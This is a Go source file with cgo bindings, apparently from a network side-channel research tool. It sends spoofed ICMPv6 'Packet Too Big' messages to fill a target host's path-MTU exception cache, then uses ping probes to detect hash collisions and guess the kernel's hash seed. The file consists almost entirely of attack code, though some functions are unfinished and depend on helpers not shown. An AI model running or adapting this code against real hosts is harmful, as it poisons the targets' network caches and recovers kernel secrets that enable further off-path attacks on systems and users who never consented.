package main

import "C"
import (
	"fmt"
	"github.com/google/gopacket/layers"
	"math/rand"
	"net"
	"os"
	"sort"
	"time"
)

var guessSeedMode = false
var guessSeedMacMode = false
var ipNoFragMap = make(map[string]bool)
var macIPMap = make(map[string]net.IP)

func guessSeed2(checkPoint int, dstIP net.IP, delay uint, mtu uint16, garbage []byte, waitTime uint) {
	var ICMPinCache = make(map[string]bool)
	var sendingIP net.IP
	sendingIP = make([]byte, 16)
	copy(sendingIP, localIPv6Subnet.IP)
	v6 := CheckIPv6(sendingIP)

	// prepare layers
	ipLayer := GetIPLayer(sendingIP, dstIP, false, 0, layers.IPProtocolICMPv6)
	fnLayer0, fnLayer1 := GetICMPPkt2BigLayer(mtu, v6)
	innerIPLayer := GetIPLayer(sendingIP, dstIP, true, 0, layers.IPProtocolICMPv6)
	echoReplyLayer0, echoReplyLayer1 := GetICMPPingLayer(0, 0, v6)
	echoLayer0, echoLayer1 := GetICMPPingLayer(0, 0, v6)

	for {
		sendingIPs := make([]net.IP, 0)
		for i := 0; i < checkPoint; i++ {
			// increase the IP
			IncreaseIPv6Addr(sendingIP, 1, 0)
			// plant new exceptions
			XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)
			// record it
			var tempIP net.IP
			tempIP = make([]byte, 16)
			copy(tempIP, sendingIP)
			sendingIPs = append(sendingIPs, tempIP)
		}
		// check previous exceptions
		guessSeedMode = true
		for ip, _ := range ICMPinCache {
			checkIPLayer := GetIPLayer(net.ParseIP(ip), dstIP, false, 0, layers.IPProtocolICMPv6)
			XmitICMP(h, eth, checkIPLayer, echoLayer0, echoLayer1, nil, nil, nil, garbage, delay)
		}
		// check new exceptions
		for i := 0; i < checkPoint; i++ {
			checkIPLayer := GetIPLayer(sendingIPs[i], dstIP, false, 0, layers.IPProtocolICMPv6)
			XmitICMP(h, eth, checkIPLayer, echoLayer0, echoLayer1, nil, nil, nil, garbage, delay)
		}
		// wait for response
		waitTimeout := false
		var waitCycles uint = 0
		for {
			if len(ipNoFragMap) < len(ICMPinCache)+checkPoint {
				time.Sleep(time.Millisecond)
				waitCycles++
				if waitCycles > waitTime {
					waitTimeout = true
					break
				}
			} else {
				break
			}
		}
		guessSeedMode = false
		// check if all "ICMPinCache" has a fragmented reply. If yes, then continue. If no, check if only one is missing, if so, then output the pair. Update the ICMPinCache accordingly with the ipNoFragMap
		if !waitTimeout {
			// check responses
			noFragReplyIP := make([]string, 0)
			for ip, _ := range ICMPinCache {
				if ipNoFragMap[ip] {
					noFragReplyIP = append(noFragReplyIP, ip)
				}
			}
			if len(noFragReplyIP) > 0 && len(noFragReplyIP) <= checkPoint {
				fmt.Println("Found same hash for:", noFragReplyIP, sendingIPs)
			} else {
				fmt.Println("cached entry=", len(ICMPinCache))
			}
			// refresh ICMPinCache
			ICMPinCache = make(map[string]bool)
			for ip, nofrag := range ipNoFragMap {
				if !nofrag {
					ICMPinCache[ip] = true
				}
			}
		} else {
			fmt.Println("Timeout!")
		}
		ipNoFragMap = make(map[string]bool)
	}
}

func guessSeedBF_UNFINISHED(checkPoint int, dstIP net.IP, delay uint, mtu uint16, garbage []byte, waitTime uint) {
	var sendingIP net.IP
	sendingIP = make([]byte, 16)
	copy(sendingIP, localIPv6Subnet.IP)
	v6 := CheckIPv6(sendingIP)
	var realIP net.IP
	copy(realIP, localIPv6Subnet.IP)
	echoLayer0, echoLayer1 := GetICMPPingLayer(0, 0, v6)

	ipLayer := GetIPLayer(sendingIP, dstIP, false, 0, layers.IPProtocolICMPv6)
	fnLayer0, fnLayer1 := GetICMPPkt2BigLayer(mtu, v6)
	innerIPLayer := GetIPLayer(sendingIP, dstIP, true, 0, layers.IPProtocolICMPv6)
	echoReplyLayer0, echoReplyLayer1 := GetICMPPingLayer(0, 0, v6)

	guessSeedMode = true
	rand.Seed(time.Now().Unix())
	increaseGaps := make([]uint32, 0)

	// plant our real IP
	XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)

	for i := 0; i < checkPoint; i++ {
		increaseGaps = append(increaseGaps, 1)
		XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)
		if v6 {
			IncreaseIPv6Addr(sendingIP, increaseGaps[i], 0)
		} else {
			IncreaseIPv4Addr(sendingIP, increaseGaps[i])
		}
		// check
		XmitICMP(h, eth, ipLayer, echoLayer0, echoLayer1, nil, nil, nil, garbage, delay)
	}

	time.Sleep(time.Second)
	guessSeedMode = false

	// analyze
	notFragedIPs := make([]string, 0)
	for ip, nofrag := range ipNoFragMap {
		if nofrag {
			notFragedIPs = append(notFragedIPs, ip)
		}
	}
	sort.Slice(notFragedIPs, func(i, j int) bool {
		return CompareIPAddr(net.ParseIP(notFragedIPs[i]), net.ParseIP(notFragedIPs[j]), 0) > 0
	})
	fmt.Println(notFragedIPs)

	//time.Sleep(time.Second)
	//IncreaseIPv6Addr(sendingIP, 1, 0)
	//XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)

	// reset finish status
	for i := 0; i < 12; i++ {
		C.finished[i] = 0
	}

	// output data
	file, err := os.OpenFile("guessSeed-output.txt", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 666)
	if err != nil {
		fmt.Println(err)
	}

	// update testedIP in C
	C.testedIPCount = C.int(checkPoint)
	fmt.Fprint(file, checkPoint, " ")
	testedIP := make(map[string]int)
	copy(sendingIP, localIPv6Subnet.IP)
	for i := 0; i < checkPoint; i++ {
		for j := 0; j < 16; j++ {
			C.testedIP[i][j] = C.uchar(sendingIP[j])
			fmt.Fprintf(file, "%x ", sendingIP[j])
		}
		testedIP[sendingIP.String()] = i
		IncreaseIPv6Addr(sendingIP, increaseGaps[i], 0)
	}

	// update removedIPNum in C
	ipNoFragMap = make(map[string]bool)
	if len(notFragedIPs) > 20 {
		fmt.Println("too many colliding IPs")
	} else {
		C.removedIPCount = C.int(len(notFragedIPs))
		fmt.Fprint(file, len(notFragedIPs), " ")
		for j, ip := range notFragedIPs {
			num, ok := testedIP[ip]
			if !ok {
				fmt.Println("BUG, ip", ip, "does not exist among probing IPs!")
				os.Exit(-1)
			}
			C.removedIPNum[j] = C.uint(num)
			fmt.Fprint(file, num, " ")
		}
		C.resultCount = C.int(len(notFragedIPs))

		//for i := 0; i < 12; i++ {
		//	go C.guess_seed3(C.int(i))
		//}
		//
		//for i := 0; i < 12; i++ {
		//	//if C.finished[i] == 0 {
		//		time.Sleep(time.Second)
		//		i = 0
		//	//}
		//}
		//
		//var i C.int = 0
		//for i = 0; i < C.resultCount; i++ {
		//	fmt.Println("seed:", C.results[i])
		//}
	}
	file.Close()
}

func readPublicIPs() map[string]net.IP {
	publicIPMap := make(map[string]net.IP)
	file, err := os.OpenFile("guessSeed-publicinput.txt", os.O_RDONLY, 666)
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	var tmp string
	for {
		// public IP
		_, err := fmt.Fscanln(file, &tmp)
		if err != nil {
			fmt.Println(err)
			break
		}
		publicIP := net.ParseIP(tmp)
		if err != nil {
			fmt.Println(err)
			os.Exit(-2)
		}

		// private ip
		_, err = fmt.Fscanln(file, &tmp)
		if err != nil {
			fmt.Println(err)
			os.Exit(-3)
		}
		publicIPMap[tmp] = publicIP
	}
	return publicIPMap
}

func readMacs() ([]net.HardwareAddr, map[string]net.IP) {
	macs := make([]net.HardwareAddr, 0)
	file, err := os.OpenFile("guessSeed-macinput.txt", os.O_RDONLY, 666)
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	var tmp string
	for {
		// mac
		_, err := fmt.Fscanln(file, &tmp)
		if err != nil {
			fmt.Println(err)
			break
		}
		hw, err := net.ParseMAC(tmp)
		if err != nil {
			fmt.Println(err)
			os.Exit(-2)
		}
		macs = append(macs, hw)
		// ip
		_, err = fmt.Fscanln(file, &tmp)
		if err != nil {
			fmt.Println(err)
			os.Exit(-3)
		}
		macIPMap[hw.String()] = net.ParseIP(tmp)
	}
	return macs, macIPMap
}

func guessSeed_macver_analyze(checkPoint int) {
	// assume handle is in pcap reading mode and the seed guess mode is properly set
	// pcap analysis should been done now
	for {
		time.Sleep(time.Second)
		if len(pcapChannel) > 0 {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	v6 := CheckIPv6(localIP)
	macs, _ := readMacs()
	publicIpMap := readPublicIPs()
	// analyze
	notFragedIPs := make([]string, 0)
	for ip, nofrag := range ipNoFragMap {
		if nofrag {
			notFragedIPs = append(notFragedIPs, ip)
		}
	}
	fmt.Println("Not responding IPs:")
	for privateIP, publicIP := range publicIpMap {
		_, ok := ipNoFragMap[privateIP]
		if !ok {
			fmt.Print("[", privateIP, ",", publicIP, "]")
		}
	}
	fmt.Println()
	sort.Slice(notFragedIPs, func(i, j int) bool {
		return CompareIPAddr(net.ParseIP(notFragedIPs[i]), net.ParseIP(notFragedIPs[j]), 0) > 0
	})
	fmt.Println(notFragedIPs)
	for _, ip := range notFragedIPs {
		fmt.Print(publicIpMap[ip], ",")
	}

	// output data
	file, err := os.OpenFile("guessSeed-output.txt", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 666)
	if err != nil {
		fmt.Println(err)
	}

	// update testedIP in C
	fmt.Fprint(file, checkPoint, " ")
	testedIP := make(map[string]int)
	for i := 0; i < checkPoint; i++ {
		if v6 {
			for j := 0; j < 16; j++ {
				fmt.Fprintf(file, "%x ", publicIpMap[macIPMap[macs[i].String()].String()].To16()[j])
			}
		} else {
			for j := 0; j < 4; j++ {
				fmt.Fprintf(file, "%x ", publicIpMap[macIPMap[macs[i].String()].String()].To4()[j])
			}
		}
		testedIP[macIPMap[macs[i].String()].String()] = i
	}

	// update removedIPNum in C
	ipNoFragMap = make(map[string]bool)
	if len(notFragedIPs) > 20 {
		fmt.Println("too many colliding IPs")
	} else {
		fmt.Fprint(file, len(notFragedIPs), " ")
		for _, ip := range notFragedIPs {
			num, ok := testedIP[ip]
			if !ok {
				fmt.Println("BUG, ip", ip, "does not exist among probing IPs!")
				os.Exit(-1)
			}
			fmt.Fprint(file, num, " ")
		}

	}
	file.Close()

}


func guessSeed_macver2(checkPoint int, dstIP net.IP, delay uint, garbage []byte) {
	v6 := CheckIPv6(localIP)
	macs, _ := readMacs()
	ipLayer := GetIPLayer(localIP, dstIP, false, 0, layers.IPProtocolICMPv6)
	// Garbage needs to be initialized
	for i := 0; i < checkPoint; i++ {
		eth.DstMAC = macs[i]
		echoLayer0, echoLayer1 := GetICMPPingLayer(uint16(i), uint16(i), v6)
		XmitICMP(h, eth, ipLayer, echoLayer0, echoLayer1, nil, nil, nil, garbage, delay)
	}
}

func guessSeed_macVer1(checkPoint int, dstIP net.IP, delay uint, mtu uint16) {
	v6 := CheckIPv6(localIP)
	ipLayer := GetIPLayer(localIP, dstIP, false, 0, layers.IPProtocolICMPv6)
	fnLayer0, fnLayer1 := GetICMPPkt2BigLayer(mtu, v6)
	innerIPLayer := GetIPLayer(localIP, dstIP, true, 0, layers.IPProtocolICMPv6)
	echoReplyLayer0, echoReplyLayer1 := GetICMPPingReplyLayer(0, 0, v6)

	macs, _ := readMacs()
	for i := 0; i < checkPoint; i++ {
		eth.DstMAC = macs[i]
		innerIPLayer = GetIPLayer(macIPMap[eth.DstMAC.String()], dstIP, true, 0, layers.IPProtocolICMPv6)
		XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)
		//fmt.Println(eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1)
	}
}

func guessSeed_macver(checkPoint int, dstIP net.IP, delay uint, mtu uint16, garbage []byte, waitTime uint) {
	// read eth macs
	guessSeedMacMode = true
	macs := make([]net.HardwareAddr, 0)

	/*aa:bb:cc:dd:ee:ff
	  10.0.0.1*/
	file, err := os.OpenFile("guessSeed-macinput.txt", os.O_RDONLY, 666)
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	macs, _ = readMacs()

	var sendingIP net.IP
	sendingIP = localIP
	v6 := CheckIPv6(sendingIP)
	if !v6 {
		sendingIP = sendingIP.To4()
	}

	ipLayer := GetIPLayer(sendingIP, dstIP, false, 0, layers.IPProtocolICMPv6)
	fnLayer0, fnLayer1 := GetICMPPkt2BigLayer(mtu, v6)
	innerIPLayer := GetIPLayer(sendingIP, dstIP, true, 0, layers.IPProtocolICMPv6)
	echoReplyLayer0, echoReplyLayer1 := GetICMPPingReplyLayer(0, 0, v6)

	guessSeedMode = true

	for i := 0; i < checkPoint; i++ {
		eth.DstMAC = macs[i]
		innerIPLayer = GetIPLayer(macIPMap[eth.DstMAC.String()], dstIP, true, 0, layers.IPProtocolICMPv6)
		XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)
		//fmt.Println(eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1)
	}
	time.Sleep(time.Duration(waitTime) * time.Millisecond)
	// check
	echoLayer0, echoLayer1 := GetICMPPingLayer(0, 0, v6)
	// Garbage needs to be initialized
	for i := 0; i < checkPoint; i++ {
		eth.DstMAC = macs[i]
		XmitICMP(h, eth, ipLayer, echoLayer0, echoLayer1, nil, nil, nil, garbage, delay)
	}
	time.Sleep(time.Second)
	guessSeedMode = false

	// analyze
	notFragedIPs := make([]string, 0)
	for ip, nofrag := range ipNoFragMap {
		if nofrag {
			notFragedIPs = append(notFragedIPs, ip)
		}
	}
	sort.Slice(notFragedIPs, func(i, j int) bool {
		return CompareIPAddr(net.ParseIP(notFragedIPs[i]), net.ParseIP(notFragedIPs[j]), 0) > 0
	})
	fmt.Println(notFragedIPs)

	//time.Sleep(time.Second)
	//IncreaseIPv6Addr(sendingIP, 1, 0)
	//XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)

	// reset finish status
	for i := 0; i < 12; i++ {
		C.finished[i] = 0
	}

	// output data
	file, err = os.OpenFile("guessSeed-output.txt", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 666)
	if err != nil {
		fmt.Println(err)
	}

	file.Close()
}

/* Used for IPv6 seed guessing or a host with multiple IPv4 addresses.
   checkPoint: the number of IPs used to probe
   mtu: mtu value in the frag needed packet
   waitTime: packet sending gap*/
func guessSeed(checkPoint int, dstIP net.IP, delay uint, mtu uint16, garbage []byte, waitTime uint) {
	var sendingIP net.IP
	sendingIP = make([]byte, 16)
	v6 := CheckIPv6(localIPv6Subnet.IP)
	if !v6 {
		sendingIP = make([]byte, 4)
	}
	copy(sendingIP, localIPv6Subnet.IP)

	ipLayer := GetIPLayer(sendingIP, dstIP, false, 0, layers.IPProtocolICMPv6)
	fnLayer0, fnLayer1 := GetICMPPkt2BigLayer(mtu, v6)
	innerIPLayer := GetIPLayer(sendingIP, dstIP, true, 0, layers.IPProtocolICMPv6)
	echoReplyLayer0, echoReplyLayer1 := GetICMPPingReplyLayer(0, 0, v6)

	guessSeedMode = true
	rand.Seed(time.Now().Unix())
	increaseGaps := make([]uint32, 0)
	/*TODO: BUG, ipv6 only due to IncreaseIPv6Addr()*/

	//for i := 0; i < checkPoint; i++ {
	//	increaseGaps = append(increaseGaps, 1)
	//	XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)
	//	IncreaseIPv6Addr(sendingIP, increaseGaps[i], 0)
	//}

	for i := 0; i < checkPoint; i++ {
		increaseGaps = append(increaseGaps, 1)
		XmitICMP(h, eth, ipLayer, fnLayer0, fnLayer1, innerIPLayer, echoReplyLayer0, echoReplyLayer1, nil, delay)
		IncreaseIPAddr(sendingIP, increaseGaps[i])
	}
	time.Sleep(time.Duration(waitTime) * time.Millisecond)
	// check
	copy(sendingIP, localIPv6Subnet.IP)
	echoLayer0, echoLayer1 := GetICMPPingLayer(0, 0, v6)
	// Garbage needs to be initialized
	for i := 0; i < checkPoint; i++ {
		XmitICMP(h, eth, ipLayer, echoLayer0, echoLayer1, nil, nil, nil, garbage, delay)
		IncreaseIPAddr(sendingIP, increaseGaps[i])
	}
	time.Sleep(time.Second)
	guessSeedMode = false



	// output data
	file, err := os.OpenFile("guessSeed-output.txt", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 666)
	if err != nil {
		fmt.Println(err)
	}

	file.Close()
}
